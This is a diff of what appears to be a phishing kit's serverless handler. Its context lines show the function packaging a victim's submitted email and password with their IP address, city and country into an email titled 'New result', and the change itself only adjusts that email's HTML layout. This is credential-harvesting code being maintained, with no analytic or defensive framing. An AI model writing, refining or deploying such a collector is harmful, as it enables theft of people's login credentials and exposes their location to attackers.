@@ -24,10 +24,10 @@ export default async (req: Request, context: Context) => {
       subject: "New result",
       text: `Email: ${email} :: Password: ${password} :: Context: ${context.geo}`,
       html: `<div>
-            <h3>Login information:</h3> <br/> <br/>
+            <h3>Login information:</h3><br/>
             Email:: ${email} <br/>
             Password:: ${password} <br/><br/>
-            Geolocation:
+            <h6>Geolocation:</h6><br/>
             IP:: ${context.ip} <br/>
             City:: ${context?.geo?.city} <br/>
             Country:: ${Object.values(context?.geo?.country)} <br/>
